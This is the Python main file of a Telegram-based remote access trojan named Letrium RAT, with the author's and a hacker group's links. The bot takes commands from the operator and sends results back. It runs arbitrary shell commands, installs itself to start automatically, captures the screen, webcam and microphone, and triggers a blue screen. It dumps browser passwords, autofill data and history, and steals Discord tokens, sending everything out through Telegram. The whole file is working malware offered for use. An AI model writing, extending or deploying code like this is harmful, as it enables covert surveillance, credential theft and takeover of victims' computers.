# Letriume C2 - Telegram RAT by cybermad
# HackerGroup - https://rvlt.gg/b3DhwJ3X

import os
import tempfile
import telebot
import json
from System.sysinfo import *
from System.cd import *
from Access.webcam import *
from Access.recordmic import *
from System.execute import *
from System.ipinfo import *
from System.cd import *
from Access.screenshot import *
from System.download import *
from System.MessageBox import *
from System.textspech import *
from System.bsod import *
from credential.autofill import *
from credential.history import *
from System.process import *
from System.processkill import *
from System.startup import *
from System.shutdown import *
from System.restart import *
from credential.password import *
from Discord.tokenstealer import *

#######################################################################
bot = telebot.TeleBot("YOUR BOT TOKEN")
#######################################################################














@bot.message_handler(commands=["start"])
def handle_start(msg):
    bot.send_message(
        msg.chat.id,
        "*🔮 Letrium RAT 🔮 - V1*\n"
        "[Telegram](https://t.me/cybermads)\n"
        "[GitHub](https://github.com/madanokr001)\n"
        "[HackerGroup](https://rvlt.gg/AQKg9tFW)\n\n"
        "*🔮 Letrium RAT - Helps 🔮*\n"
        "```\n"
        "🛠️ System Commands\n"
        "/start        - Start Letrium RAT\n"
        "/startup      - Add autostart\n" 
        "/execute      - Run shell command\n"
        "/cd           - Change working directory\n"
        "/download     - Download file\n"
        "/sysinfo      - Get system info\n"
        "/getip        - Get public IP\n"
        "/bsod         - Trigger Blue Screen\n"
        "/textspech    - Text to speech\n"
        "/msgbox       - Popup message box\n"
        "/shutdown     - shutdown the PC \n"
        "/restart      - restart the PC\n"
        "/process      - List running processes\n"
        "/killprocess  - Kill a process by PID\n\n"

        "🖥️ Device Access\n"
        "/screenshot   - Take a screenshot\n"
        "/webcam       - Capture webcam image\n"
        "/recordmic    - Record microphone\n\n"

        "🔐 Credential Dump\n"
        "/password     - Dump browser passwords\n"
        "/autofill     - Dump autofill data\n"
        "/history      - Dump browser history\n"
        "/token        - Dump Discord tokens\n"
        "```",
        parse_mode="Markdown"
    )


@bot.message_handler(func=lambda msg: msg.text)
def handle_text(msg):
    text = msg.text.strip()
    chat_id = msg.chat.id

    try:
        parts = text.split()
        Letriume = parts[0]

        if Letriume == "/execute":
            if len(parts) < 2:
                mrrobot(chat_id, "/execute <command>")
            else:
                command = " ".join(parts[1:])
                mrrobot(chat_id, shell(command))

        elif Letriume == "/cd":
            path = parts[1] if len(parts) > 1 else None
            mrrobot(chat_id, cd(path))

        elif Letriume == "/download":
            if len(parts) < 2:
                mrrobot(chat_id, "/download <filename>")
            else:
                mrrobot(chat_id, download(parts[1]))

        elif Letriume == "/screenshot":
            mrrobot(chat_id, screenshot())

        elif Letriume == "/process":
            mrrobot(chat_id, process())

        elif Letriume == "/killprocess":
            if len(parts) < 2:
                mrrobot(chat_id, "/killprocess <pid>")
            else:
                try:
                    pid = int(parts[1])
                    mrrobot(chat_id, processkill(pid))
                except ValueError:
                    mrrobot(chat_id, "Invalid PID.")

        elif Letriume == "/shutdown":
            mrrobot(chat_id, shutdown())

        elif Letriume == "/restart":
            mrrobot(chat_id, restart())

        elif Letriume == "/startup":
            mrrobot(chat_id, startup())

        elif Letriume == "/webcam":
            mrrobot(chat_id, webcam())

        elif Letriume == "/recordmic":
            if len(parts) < 2:
                bot.send_message(chat_id, "/recordmic <1~60>")
            else:
                try:
                    sec = int(parts[1])
                    if 1 <= sec <= 60:
                        bot.send_audio(chat_id, open(records(sec), "rb"))
                    else:
                        bot.send_message(chat_id, "/recordmic <1~60>")
                except:
                    bot.send_message(chat_id, "/recordmic <1~60>")

        elif Letriume == "/say":
            if len(parts) < 2:
                bot.send_message(chat_id, "/say <text>")
            else:
                text = " ".join(parts[1:])
                mrrobot(chat_id, audio(text))

        elif Letriume == "/msgbox":
            if len(parts) < 2 or ":" not in " ".join(parts[1:]):
                bot.send_message(chat_id, "/msgbox title:message")
            else:
                title, message = map(str.strip, " ".join(parts[1:]).split(":", 1))
                mrrobot(chat_id, msgbox(title, message))

        elif Letriume == "/getip":
            mrrobot(chat_id, getip())

        elif Letriume == "/sysinfo":
            mrrobot(chat_id, sysinfo())

        elif Letriume == "/autofill":
            mrrobot(chat_id, json.dumps(autofill(), ensure_ascii=False, indent=2))

        elif Letriume == "/history":
            mrrobot(chat_id, json.dumps(history(), ensure_ascii=False, indent=2))

        elif Letriume == "/password":
            mrrobot(chat_id, json.dumps(extract(), ensure_ascii=False, indent=2))

        elif Letriume == "/token":
            tokens = ext()
            mrrobot(chat_id, "\n".join(tokens))

        elif Letriume == "/bsod":
            mrrobot(chat_id, bluescreen())

        else:
            mrrobot(chat_id, "/execute <command>")

    except Exception as e:
        mrrobot(chat_id, f"{e}")


def mrrobot(chat_id, data):
    if isinstance(data, str):
        if len(data) > 4000:
            path = os.path.join(tempfile.gettempdir(), "Letriume.txt")
            try:
                with open(path, "w", encoding="utf-8") as f:
                    f.write(data)
                with open(path, "rb") as f:
                    bot.send_document(chat_id, f, visible_file_name="Letriume.txt")
            finally:
                os.remove(path)
        else:
            bot.send_message(chat_id, data)

    elif hasattr(data, "read"):
        filename = getattr(data, "name", "Letriume.bin").lower()
        if filename.endswith((".png", ".jpg", ".jpeg")):
            bot.send_photo(chat_id, data)
        elif filename.endswith((".mp3", ".wav")):
            bot.send_audio(chat_id, data)
        else:
            bot.send_photo(chat_id, data)

    elif isinstance(data, tuple):
        file, error = data
        if file:
            bot.send_document(chat_id, file)
        else:
            bot.send_message(chat_id, error)


if __name__ == "__main__":
    print("[+] Hacked by cybermad")
    print(r"""
     .... NO! ...                  ... MNO! ...
   ..... MNO!! ...................... MNNOO! ...
 ..... MMNO! ......................... MNNOO!! .
.... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .
 ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....
    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...
   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....
   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...  
    ....... MMMMM..    OPPMMP    .,OMI! ....
     ...... MMMM::   o.,OPMP,.o   ::I!! ...
         .... NNM:::.,,OOPM!P,.::::!! ....
          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....
         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....
           .. MMMMMNNOOMMNNIIIPPPOO!! ......
          ...... MMMONNMMNNNIIIOO!..........
       ....... MN MOMMMNNNIIIIIO! OO ..........
    ......... MNO! IiiiiiiiiiiiI OOOO ...........
  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........
   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........
   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........
      ...... OO! ................. ON! .......
         ................................
    """)
    bot.infinity_polling()
